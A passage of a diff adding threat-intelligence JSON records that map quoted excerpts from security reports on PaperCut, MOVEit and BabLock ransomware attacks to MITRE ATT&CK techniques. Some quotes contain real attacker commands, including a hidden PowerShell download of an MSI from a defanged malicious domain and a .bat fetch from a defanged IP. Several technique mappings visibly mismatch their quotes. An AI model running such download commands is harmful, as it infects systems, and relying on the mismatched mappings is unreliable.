+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1486",
+        "name": "Data Encrypted for Impact",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1486"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“Our team is tracking in-the-wild exploitation of zero-day vulnerabilities against PaperCut MF/NG which allow for unauthenticated remote code execution due to an authentication bypass.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1587.004",
+        "name": "Develop Capabilities: Exploits",
+        "parent_id": "T1587",
+        "url": "https://attack.mitre.org/techniques/T1587/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“Huntress has observed post-exploitation activities within our partner environments following the exploitation of recent PaperCut MF/NG vulnerabilities.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.002",
+        "name": "Obtain Capabilities: Tool",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“The domain was registered shortly before the events above, on 12 April, and leverages Cloudflare services to obfuscate primary hosting.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1608.001",
+        "name": "Stage Capabilities: Upload Malware",
+        "parent_id": "T1608",
+        "url": "https://attack.mitre.org/techniques/T1608/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“When bundled up into a standalone attack script, an adversary could achieve initial access as SYSTEM, establish command-and-control, and then continue post-exploitation.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1078"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“After authentication has been bypassed, a threat actor may then execute arbitrary code on the server running in the context of the NT AUTHORITY\\SYSTEM account.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1078.003",
+        "name": "Valid Accounts: Local Accounts",
+        "parent_id": "T1078",
+        "url": "https://attack.mitre.org/techniques/T1078/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“We reported related activity on April 16 when we observed the following command was spawned from PaperCut software: cmd /c \"powershell.exe -nop -w hidden Invoke-WebRequest 'hXXp://upd488[.]windowservicecemter[.]com/download/setup.msi' -OutFile 'setup.msi'\" (line breaks added…” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“4/22/23 Exploitation Seen On 4/22/23 new exploitation was seen where the first stage pulled down a .bat file (http://50.19.48[.]59:82/me1.bat): cmd.exe /c powershell -enc…” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“These printer scripts are written in JavaScript using the embedded Rhino JavaScript engine.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/007"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“Detection Efforts From our recreated proof-of-concept, we observed child processes spawned underneath the pc-app.exe process.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1106",
+        "name": "Native API",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1106"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“- This will not prevent exploitation of this vulnerability if a threat actor gained access to the local network and pivoted laterally.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1203",
+        "name": "Exploitation for Client Execution",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1203"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“If you are looking for indicators of compromise, you can review the Application Logs within the PaperCut interface.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“- 1014 total Windows hosts with PaperCut installed” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
+        "parent_id": "T1070",
+        "url": "https://attack.mitre.org/techniques/T1070/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "low",
+      "description": "“Reviewing the domain and its history in various tools and archives showed several download strings beyond that directly observed by Huntress:” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "parent_id": "T1090",
+        "url": "https://attack.mitre.org/techniques/T1090/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“- upd488[.]windowservicecemter[.]com/download/ld.txt” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "high",
+      "description": "“- upd488[.]windowservicecemter[.]com/download/a3.msi The MSI packages install two different RMM tools: Atera, as already noted, and also Syncro.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1219",
+        "name": "Remote Access Tools",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1219"
+      }
+    },
+    {
+      "attack_ref": "INC-0145",
+      "confidence": "medium",
+      "description": "“UPDATE #1 - 4/25/23 @ 11am ET: Added information about additional exploitation seen against Papercut MF/NG Server where a crypto-miner was deployed.” — Huntress",
+      "provenance": {
+        "article_source": "Huntress",
+        "article_url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1496",
+        "name": "Resource Hijacking",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1496"
+      }
+    },
+    {
+      "attack_ref": "INC-0331",
+      "confidence": "medium",
+      "description": "“- GreyNoise reportedly observed scanning for the \"human.aspx\" files in March 2023” — Curated Intel",
+      "provenance": {
+        "article_source": "Curated Intel",
+        "article_url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Curated Intel: CL0P likes to MOVEit MOVEit",
+          "url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1553.002",
+        "name": "Subvert Trust Controls: Code Signing",
+        "parent_id": "T1553",
+        "url": "https://attack.mitre.org/techniques/T1553/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0331",
+      "confidence": "medium",
+      "description": "“This time they targeted the MOVEit Transfer application by Progress Software using an SQLi vulnerability tracked as CVE-2023-34362.” — Curated Intel",
+      "provenance": {
+        "article_source": "Curated Intel",
+        "article_url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Curated Intel: CL0P likes to MOVEit MOVEit",
+          "url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1124",
+        "name": "System Time Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1124"
+      }
+    },
+    {
+      "attack_ref": "INC-0331",
+      "confidence": "low",
+      "description": "“On or around 27 May 2023, the CL0P operators exploited another file transfer server.” — Curated Intel",
+      "provenance": {
+        "article_source": "Curated Intel",
+        "article_url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Curated Intel: CL0P likes to MOVEit MOVEit",
+          "url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1570",
+        "name": "Lateral Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1570"
+      }
+    },
+    {
+      "attack_ref": "INC-0331",
+      "confidence": "medium",
+      "description": "“Our trust group is tracking all the developments of CL0P's MOVEit Transfer hacking campaign in our GitHub repository here:” — Curated Intel",
+      "provenance": {
+        "article_source": "Curated Intel",
+        "article_url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Curated Intel: CL0P likes to MOVEit MOVEit",
+          "url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1102.002",
+        "name": "Web Service: Bidirectional Communication",
+        "parent_id": "T1102",
+        "url": "https://attack.mitre.org/techniques/T1102/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "medium",
+      "description": "“After the encryption, txt notes with ransom demands for decryption were created in each directory and two email addresses were provided to contact the operators.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1589.002",
+        "name": "Gather Victim Identity Information: Email Addresses",
+        "parent_id": "T1589",
+        "url": "https://attack.mitre.org/techniques/T1589/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "medium",
+      "description": "“Additionally, BabLock gang (also tracked under the name “Rorschach” by CheckPoint), unlike most of its “industry peers”, is not using a Data Leak Site (DLS) and is communicating with its victims via email.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "medium",
+      "description": "“In addition, we detected connections to an external IP address, which is used by Cobalt Strike network infrastructure.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.002",
+        "name": "Obtain Capabilities: Tool",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1078"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“- creating local and domain accounts” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
